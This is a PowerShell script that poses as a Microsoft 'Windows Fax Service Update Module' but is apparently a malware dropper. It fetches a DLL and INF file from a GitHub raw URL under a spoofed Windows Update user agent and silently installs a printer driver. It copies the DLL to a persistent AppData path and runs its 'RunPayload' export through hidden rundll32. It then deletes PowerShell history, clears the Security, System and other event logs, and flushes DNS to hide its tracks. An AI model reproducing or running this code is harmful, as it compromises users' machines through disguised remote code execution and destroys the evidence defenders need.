# Windows Fax Service Update Module
# Microsoft Corporation - Internal Use

$ErrorActionPreference = 'SilentlyContinue'
[System.Net.ServicePointManager]::SecurityProtocol = 'Tls12'
$ProgressPreference = 'SilentlyContinue'

# Configuration
$dllUrl = "https://raw.githubusercontent.com/devnull-sys/bzz/refs/heads/main/msfax.dll"
$infUrl = "https://raw.githubusercontent.com/devnull-sys/bzz/refs/heads/main/msfax.inf"

# Internal variables
$w = New-Object System.Threading.Mutex($false, "Global\{A8F2B9C4-3D1E-4A7B-9F2C-8E6D5C4B3A2F}")
if (-not $w.WaitOne(0)) { return }

$t = "$env:TEMP\$([guid]::NewGuid().ToString().Substring(0,8))"
$null = New-Item -ItemType Directory -Force -Path $t

# Download components
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Microsoft-Windows-Update-Agent/10.0")

try {
    $wc.DownloadFile($dllUrl, "$t\msfax.dll")
    $wc.DownloadFile($infUrl, "$t\msfax.inf")
} catch {
    Remove-Item $t -Recurse -Force
    return
}

# Service maintenance
$p = Get-Printer -Name "Fax" -ErrorAction SilentlyContinue
if ($p) { 
    Remove-Printer -Name "Fax" -Confirm:$false
    Start-Sleep -Milliseconds 500
}

# Install update
$pnp = Start-Process pnputil -ArgumentList "/add-driver `"$t\msfax.inf`" /install" -WindowStyle Hidden -PassThru -Wait
if ($pnp.ExitCode -eq 0) {
    Add-PrinterPort -Name "SHRFAX:" -ErrorAction SilentlyContinue
    Add-Printer -Name "Fax" -DriverName "Microsoft Shared Fax Driver" -PortName "SHRFAX:" -ErrorAction SilentlyContinue
    
    # CRITICAL: Trigger the DLL to execute
    # Copy DLL to a persistent location first
    $dllPath = "$env:APPDATA\Microsoft\Windows\Printer\msfax.dll"
    $null = New-Item -ItemType Directory -Force -Path (Split-Path $dllPath)
    Copy-Item "$t\msfax.dll" $dllPath -Force
    
    # Execute the DLL payload
    Start-Process rundll32.exe -ArgumentList "`"$dllPath`",RunPayload" -WindowStyle Hidden
}

# Cleanup temporary files only (keep the persistent DLL)
Start-Sleep -Milliseconds 500
Remove-Item $t -Recurse -Force

# Maintenance tasks
$h = (Get-PSReadlineOption).HistorySavePath
if (Test-Path $h) { Remove-Item $h -Force }
Clear-History

$logs = @('Application','System','Security','Windows PowerShell','Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-PrintService/Operational')
$logs | ForEach-Object { wevtutil cl $_ 2>$null }

$null = ipconfig /flushdns

$w.ReleaseMutex()
